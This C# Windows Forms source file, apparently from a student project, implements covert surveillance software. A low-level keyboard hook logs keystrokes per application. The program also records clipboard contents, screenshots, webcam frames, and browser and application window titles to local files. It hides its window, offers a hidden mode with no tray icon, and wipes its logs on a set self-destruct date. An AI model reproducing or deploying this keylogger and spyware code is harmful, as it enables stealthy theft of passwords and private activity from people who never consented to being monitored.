using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using AForge.Video.DirectShow;
using SmartHotKey;

namespace DoAn_QLCC
{
    public partial class Form1 : Form
    {
        #region DLLimport
        /*  [DllImport("winmm.dll", EntryPoint = "mciSendStringA", ExactSpelling = true, CharSet = CharSet.Ansi, SetLastError = true)]
          private static extern int record(string lpstrCommand, string lpstrReturnString, int uReturnLength, int hwndCallback);
          */
        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        static extern IntPtr GetForegroundWindow();
        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        static extern int GetWindowText(IntPtr hWnd, StringBuilder text, int count);
        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        static extern int GetWindowTextLength(IntPtr hWnd);

        [DllImport("user32.dll", SetLastError = true)]
        public static extern uint GetWindowThreadProcessId(IntPtr hWnd, out uint lpdwProcessId);

        private const int WH_KEYBOARD_LL = 13;
        private const int WM_KEYDOWN = 0x0100;

        private static LowLevelKeyboardProc _proc = HookCallback;
        private static IntPtr _hookID = IntPtr.Zero;
        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr SetWindowsHookEx(int idHook,
            LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode,
            IntPtr wParam, IntPtr lParam);


        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr GetModuleHandle(string lpModuleName);

        private delegate IntPtr LowLevelKeyboardProc(
        int nCode, IntPtr wParam, IntPtr lParam);
        [DllImport("wininet.dll")]
        private extern static bool InternetGetConnectedState(out int description, int reservedValue);

        WinEventDelegate dele = null;
        #endregion
        public Form1()
        {
            InitializeComponent(); 
            if (DoAn_QLCC.Properties.Settings.Default.State_warning_text == true)
            {
                MessageBox.Show(DoAn_QLCC.Properties.Settings.Default.Warning_text, "Warning");
            }
            if (DoAn_QLCC.Properties.Settings.Default.SuDung_LanD == true)
            {
                DoAn_QLCC.Properties.Settings.Default.SuDung_LanD = false;
                this.hotKey1.HotKeyPressed += new HotKey.HotKeyEventHandler(this.hotKey1_HotKeyPressed);
                hotKey1.AddHotKey("Control+A");
            }
            else 
            { 
                DateTime dt = DateTime.Now;
                this.hotKey1.HotKeyPressed += new HotKey.HotKeyEventHandler(this.hotKey1_HotKeyPressed);
                hotKey1.AddHotKey(DoAn_QLCC.Properties.Settings.Default.Hot_Key);
                if (DoAn_QLCC.Properties.Settings.Default.Self_destruct_date == dt.ToShortDateString())
                {
                    Options_Form_Controller.ClearLog_Controller cls = new Options_Form_Controller.ClearLog_Controller();
                    cls.clear_LogScreen();
                    cls.clear_LogWebCam();
                    cls.clearlog_Clipboard();
                    cls.clearlog_LogApp();
                    cls.clearlog_LogWeb();
                    cls.clearText_Keystrokes();
                }
            }
            Start_WebCam();
            this.Hide();// Timer_ScreenShoot.Interval = 100000; Timer_ScreenShoot.Enabled = true;
                        // Timer_ScreenShoot.Start();

            dele = new WinEventDelegate(WinEventProc);
            IntPtr m_hhook = SetWinEventHook(EVENT_SYSTEM_FOREGROUND, EVENT_SYSTEM_FOREGROUND, IntPtr.Zero, dele, 0, 0, WINEVENT_OUTOFCONTEXT);
            // MessageBox.Show(System.Security.Principal.WindowsIdentity.GetCurrent().Name.ToString())
            HookKeyboard();
           
        }


        private static IntPtr SetHook(LowLevelKeyboardProc proc)
        {

            using (Process curProcess = Process.GetCurrentProcess())
            {
                using (ProcessModule curModule = curProcess.MainModule)
                {
                    return SetWindowsHookEx(WH_KEYBOARD_LL, proc,
                    GetModuleHandle(curModule.ModuleName), 0);
                }
            }
        }

        private static string keystroke_log;
        public static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (DoAn_QLCC.Properties.Settings.Default.Strop_Logging_All != true&&DoAn_QLCC.Properties.Settings.Default.Enable_keystroke==true)
            {
                if (DoAn_QLCC.Properties.Settings.Default.Block_Keystroke == false)
                {
                    if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
                    {
                        int vkCode = Marshal.ReadInt32(lParam);
                        if (currentAplication == "" || currentAplication == Getapplicationname())
                        {

                            currentAplication = Getapplicationname();
                            keystroke_log += ((Keys)vkCode);

                        }
                        else
                        {

                            currentAplication = Getapplicationname();
                            WriteLog();
                            strtam = "";
                        }

                    }
                }
                return CallNextHookEx(_hookID, nCode, wParam, lParam);
            }
            return CallNextHookEx(_hookID, nCode, wParam, lParam);
        }
        private static string currentAplication = "";
        private static string strtam;
        public static void WriteLog()
        {
            DateTime dt = DateTime.Now;
            StreamReader rd = new StreamReader("KeyStroke.txt"); string strtam2 = rd.ReadToEnd(); rd.Close();
            StreamWriter sw = new StreamWriter("KeyStroke.txt");
            strtam = dt.Date.ToLongDateString() + "°" + dt.TimeOfDay.ToString() + "°" + System.Security.Principal.WindowsIdentity.GetCurrent().Name.ToString() + "°" + Getapplicationname() + ".exe" + "°" + keystroke_log + "°" + "Keystrokes" + "‿";
            strtam2 = string.Concat(strtam2, strtam);
            sw.Write(strtam2);
            keystroke_log = "";
            sw.Close();
            strtam2 = "";


        }


        static void HookKeyboard()
        {
            _hookID = SetHook(_proc);
            Application.Run();
            UnhookWindowsHookEx(_hookID);
        }

        public static string SetName()
        {
            DateTime dt = DateTime.Now;
            string nameset = dt.Date.ToString();
            return nameset;
        }

        private static string Getapplicationname()
        {
            IntPtr hWnd = GetForegroundWindow();
            uint procId = 0;
            GetWindowThreadProcessId(hWnd, out procId);
            var proc = Process.GetProcessById((int)procId);
            return (proc.ProcessName).ToString();
        }

        private void viewLogToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (DoAn_QLCC.Properties.Settings.Default.Protect_log_viewer == true && DoAn_QLCC.Properties.Settings.Default.Enable_security == true)
            {
                Password_checker frm = new Password_checker("logview");
                frm.Show();
            }
            else
            {
                Log_View frm = new Log_View();
                frm.Show();
            }
        }
        private string Clipboard1;
        private void Timer_clpboard_Tick(object sender, EventArgs e)
        {
            if (DoAn_QLCC.Properties.Settings.Default.Strop_Logging_All == false&&DoAn_QLCC.Properties.Settings.Default.Enable_clipboard==true)
            {
                if (Clipboard1 == "" || Clipboard.GetText() != Clipboard1)
                {
                    try
                    {
                        Clipboard1 = Clipboard.GetText();
                        DateTime dt = DateTime.Now;
                        StreamReader rd = new StreamReader("ClipBoard.txt"); string strtam4 = rd.ReadToEnd(); rd.Close();
                        StreamWriter sw = new StreamWriter("ClipBoard.txt");
                        string strtam3 = dt.Date.ToLongDateString() + "°" + dt.TimeOfDay.ToString() + "°" + System.Security.Principal.WindowsIdentity.GetCurrent().Name.ToString() + "°" + Getapplicationname() + ".exe" + "°" + Clipboard.GetText() + "°" + "ClipBoard" + "‿";
                        strtam4 = string.Concat(strtam4, strtam3);
                        sw.Write(strtam4);
                        keystroke_log = "";
                        sw.Close();
                        strtam3 = "";
                        strtam4 = "";

                    }
                    catch { }
                }
            }
        } 
        private Bitmap screenBitmap;
        private Graphics screenGraphics;
        private void Timer_ScreenShoot_Tick(object sender, EventArgs e)
        {
            if (DoAn_QLCC.Properties.Settings.Default.Strop_Logging_All == false&&DoAn_QLCC.Properties.Settings.Default.Enable_Screenshoot==true)
            {
                WindowsPrincipal wp = new WindowsPrincipal(WindowsIdentity.GetCurrent());
                String username = wp.Identity.Name;
                string[] user = username.Split('\\');
                DateTime dt = DateTime.Now;
                string fileName = dt.Date.ToLongDateString() + "°" + dt.TimeOfDay.Hours + "hour," + dt.TimeOfDay.Minutes + "minute," + dt.TimeOfDay.Seconds + "second°" + user[1] + "°" + Getapplicationname() + "°" + "Screenshoot" + "°" + ".png";
                screenBitmap = new Bitmap(Screen.PrimaryScreen.Bounds.Width,
                                Screen.PrimaryScreen.Bounds.Height,
                                PixelFormat.Format32bppArgb);
                screenGraphics = this.CreateGraphics();
                screenGraphics = Graphics.FromImage(screenBitmap);
                saveFileDialog1.FileName = fileName;
                saveFileDialog1.Filter = "Bitmap (*.png)|*.png";
                screenGraphics.CopyFromScreen(Screen.PrimaryScreen.Bounds.X, Screen.PrimaryScreen.Bounds.Y,
                                           0, 0, new Size(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height));
                screenBitmap.Save(saveFileDialog1.FileName, ImageFormat.Png);
            }
        }
        delegate void WinEventDelegate(IntPtr hWinEventHook, uint eventType, IntPtr hwnd, int idObject, int idChild, uint dwEventThread, uint dwmsEventTime);

        [DllImport("user32.dll")]
        static extern IntPtr SetWinEventHook(uint eventMin, uint eventMax, IntPtr hmodWinEventProc, WinEventDelegate lpfnWinEventProc, uint idProcess, uint idThread, uint dwFlags);

        private const uint WINEVENT_OUTOFCONTEXT = 0;
        private const uint EVENT_SYSTEM_FOREGROUND = 3;


        private string GetActiveWindowTitle()
        {
            const int nChars = 256;
            IntPtr handle = IntPtr.Zero;
            StringBuilder Buff = new StringBuilder(nChars);
            handle = GetForegroundWindow();

            if (GetWindowText(handle, Buff, nChars) > 0)
            {
                return Buff.ToString();
            }
            return null;
        }
        private string pretitle_app="";
        public void WinEventProc(IntPtr hWinEventHook, uint eventType, IntPtr hwnd, int idObject, int idChild, uint dwEventThread, uint dwmsEventTime)
        {
            if (DoAn_QLCC.Properties.Settings.Default.Strop_Logging_All == false)
            {
                
                if (Getapplicationname() == "iexplore" || Getapplicationname() == "chrome" || Getapplicationname() == "firefox" || Getapplicationname() == "browser" || Getapplicationname() == "opera")
                {
                    if (DoAn_QLCC.Properties.Settings.Default.Enable_LogWeb == true)
                    {
                        if (pretitle_app != GetActiveWindowTitle())
                        {
                            pretitle_app = GetActiveWindowTitle();
                            DateTime dt = DateTime.Now;
                            string date = dt.Date.ToLongDateString();
                            string time = dt.Hour.ToString() + "Hour" + dt.Minute.ToString() + "Minute" + dt.Second.ToString() + "Second";
                            WindowsPrincipal wp = new WindowsPrincipal(WindowsIdentity.GetCurrent());
                            String username = wp.Identity.Name;
                            string[] user = username.Split('\\');

                            if (Getapplicationname() == "iexplore")
                            {
                                app = "Internet Explore";

                            }
                            else
                            {
                                if (Getapplicationname() == "chrome")
                                {
                                    app = "Google Chrome";
                                }
                                else
                                {
                                    if (Getapplicationname() == "broswer")
                                    {
                                        app = "Coc Coc";
                                    }
                                    else
                                    {
                                        if (Getapplicationname() == "firefox")
                                        {
                                            app = "Mozila Firefox";
                                        }
                                        else
                                        {
                                            if (Getapplicationname() == "opera")
                                            {
                                                app = "Opera";
                                            }
                                        }
                                    }
                                }
                            }
                            string titleapp = GetActiveWindowTitle();
                            writelog_Web(date, time, user[1], app, titleapp);
                            app = "";
                        }
                    }
                }
                else if(DoAn_QLCC.Properties.Settings.Default.Enable_LogApp==true)
                {
                    DateTime dt = DateTime.Now;
                    string date = dt.Date.ToLongDateString();
                    string time = dt.Hour.ToString() + "Hour" + dt.Minute.ToString() + "Minute" + dt.Second.ToString() + "Second";
                    WindowsPrincipal wp = new WindowsPrincipal(WindowsIdentity.GetCurrent());
                    String username = wp.Identity.Name;
                    string[] user = username.Split('\\');
                    string applica = Getapplicationname();
                    string tit = GetActiveWindowTitle();
                    writelogApplication(date, time, user[1], applica, tit);
                }
            }
        }
       private string app;
        private void writelog_Web(string date,string time,string user,string kindwebbro,string title)
        {
            StreamReader rd = new StreamReader("logWeb.txt");
            string text_weblog=rd.ReadToEnd();
            rd.Close();
            string text2 = date + "°" + time + "°" + user + "°" + kindwebbro + "°" + title + "‿";
            string text_towrite = String.Concat(text_weblog, text2);
            StreamWriter wt = new StreamWriter("logWeb.txt");
            wt.Write(text_towrite);
            wt.Close();
           
        }
        private void writelogApplication(string date, string time, string user, string appli, string tit)
        {
            StreamReader rd = new StreamReader("logApp.txt");
            string text_weblog = rd.ReadToEnd();
            rd.Close();
            string text2 = date + "°" + time + "°" + user + "°" + appli + "°" + tit + "‿";
            string text_towrite = String.Concat(text_weblog, text2);
            StreamWriter wt = new StreamWriter("logApp.txt");
            wt.Write(text_towrite);
            wt.Close();
        }
        FilterInfoCollection videoDevices;
        public void Start_WebCam()
        {
            videoDevices = new FilterInfoCollection(FilterCategory.VideoInputDevice);

            if (videoDevices.Count == 0)
                throw new ApplicationException();

            // add all devices to combo
            foreach (FilterInfo device in videoDevices)
            {
                devicesCombo.Items.Add(device.Name);
            }
            devicesCombo.SelectedIndex = 0;

            VideoCaptureDevice videoCaptureSource = new VideoCaptureDevice(videoDevices[devicesCombo.SelectedIndex].MonikerString);
            videoSourcePlayer.VideoSource = videoCaptureSource;
            videoSourcePlayer.Start();
        }
        private void Timer_Webcam_Tick(object sender, EventArgs e)
        {
            if (DoAn_QLCC.Properties.Settings.Default.Strop_Logging_All == true&&DoAn_QLCC.Properties.Settings.Default.Enable_Webcam==true)
            {

                try
                {
                    // enumerate video devices

                    WindowsPrincipal wp = new WindowsPrincipal(WindowsIdentity.GetCurrent());
                    String username = wp.Identity.Name;
                    string[] user = username.Split('\\');
                    DateTime dt = DateTime.Now;
                    string fileName = dt.Date.ToLongDateString() + "°" + dt.TimeOfDay.Hours + "hour," + dt.TimeOfDay.Minutes + "minute," + dt.TimeOfDay.Seconds + "second°" + user[1] + "°" + Getapplicationname() + "°" + "webCam" + "°" + ".png";

                    try
                    {
                        if (videoSourcePlayer.IsRunning)
                        {
                            Bitmap picture = videoSourcePlayer.GetCurrentVideoFrame();
                            picture.Save(fileName, ImageFormat.Jpeg);
                            //   labelSaved.Text = "Capture Saved : " + strFilename;
                        }
                    }
                    catch
                    {
                        videoSourcePlayer.SignalToStop();
                        videoSourcePlayer.WaitForStop();
                        videoDevices = null;
                        videoDevices = null;

                    }
                }
                catch (ApplicationException)
                {
                    videoSourcePlayer.SignalToStop();
                    videoSourcePlayer.WaitForStop();
                    videoDevices = null;
                    videoDevices = null;

                }

            }
        }
        
        private void Form1_FormClosing(object sender, FormClosingEventArgs e)
        {
          
        }
        //private int a;
        private void Timer_Record_Tick(object sender, EventArgs e)
        {
           /* Console.WriteLine(a);

            if (a != 0)
            {
                if (a == 1)
                {
                    record("open new Type waveaudio Alias recsound", "", 0, 0);
                    record("record recsound", "", 0, 0);
                    a++;
                }
                else
                {
                    if (a != 10)
                    {
                        a++;
                    }
                    else
                    {
                        try
                        {
                            a = 0;

                        }
                        catch (Exception ex)
                        {
                            a = 0;
                        }
                    }
                }
            }
            else
            {
                
                    WindowsPrincipal wp = new WindowsPrincipal(WindowsIdentity.GetCurrent());
                    String username = wp.Identity.Name;
                    string[] user = username.Split('\\');
                    DateTime dt = DateTime.Now;
                    string fileName = System.IO.Directory.GetCurrentDirectory() + "\\" + dt.Date.ToLongDateString() + "°" + dt.TimeOfDay.Hours + "hour," + dt.TimeOfDay.Minutes + "minute," + dt.TimeOfDay.Seconds + "second"+"°" + user[1] + ".wav";
                    record(@"save recsound C:\Users\Admin\Pictures\DoAn_QLCC\DoAn_QLCC\bin\Debug\\Tuesday,February27,2018°15hour,15minute,15second°Admin.wav", "", 0, 0);
                    record("close recsound", "", 0, 0);
                    Console.WriteLine(fileName);
                    a++;

                
                
            }*/
        }

        private void hiddenModeToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (DoAn_QLCC.Properties.Settings.Default.Enable_security == true && DoAn_QLCC.Properties.Settings.Default.Protect_hidden_mode == true)
            {
                Password_checker frm = new Password_checker("hiddenmode");
                frm.Show();
            }
            else
            {
                if (DoAn_QLCC.Properties.Settings.Default.CheckShowMessage_Again == true)
                {
                    HiddenMode_Form frm = new HiddenMode_Form();

                    frm.Show();
                    timer_Check_Cancle.Start();
                    timer_Check_Cancle.Enabled = true;
                }
                else
                {
                    notifyIcon1.Visible = false;
                }
            }
        }
        private void timer_Check_Cancle_Tick(object sender, EventArgs e)
        {
            if (DoAn_QLCC.Properties.Settings.Default.Check_Cancel_HiddenMode == true)
            {
                DoAn_QLCC.Properties.Settings.Default.Check_Cancel_HiddenMode = false;
                if (DoAn_QLCC.Properties.Settings.Default.CancelorOK_Hiddenmode == true)
                {
                    notifyIcon1.Visible = false;
                    DoAn_QLCC.Properties.Settings.Default.CancelorOK_Hiddenmode = false;
                }
                DoAn_QLCC.Properties.Settings.Default.Save();
                timer_Check_Cancle.Stop();
             
            }
        }
        HotKey hotKey1 = new HotKey();
        private void Form1_Load(object sender, EventArgs e)
        {
            
        }
        private void hotKey1_HotKeyPressed(object sender, HotKeyEventArgs e)
        {
            if (notifyIcon1.Visible == false)
            {
                notifyIcon1.Visible = true;
                if (DoAn_QLCC.Properties.Settings.Default.CheckShowMessage_Again == true)
                {
                    HiddenMode_Form frm = new HiddenMode_Form(false);
                    frm.Show();
                    timer_Check_Cancle.Start();
                    timer_Check_Cancle.Enabled = true;
                }
            }
            else
            {
                notifyIcon1.Visible = false;
            }
            
        }

        private void optionsToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (DoAn_QLCC.Properties.Settings.Default.Protect_Option_viewer == true && DoAn_QLCC.Properties.Settings.Default.Enable_security == true)
            {
                Password_checker frm = new Password_checker("optionview");
                frm.Show();
            }
            else
            {
                Options_view frm = new Options_view();
                frm.Show();
            
            }
        }

        private void notifyIcon1_Click(object sender, EventArgs e)
        {
          //  Log_View frm = new Log_View();
           // frm.Show();
        }

        private void homePageToolStripMenuItem_Click(object sender, EventArgs e)
        {

        }

        private void exitToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (DoAn_QLCC.Properties.Settings.Default.Enable_security != true && DoAn_QLCC.Properties.Settings.Default.Protect_exit == false)
            {
                try
                {
                    //  Application.Exit();
                    Environment.Exit(1);
                }
                catch { Application.Exit(); }
            }
            else 
            {
                Password_checker frm = new Password_checker("exit");
                frm.Show();
            }
        }
    }
    }



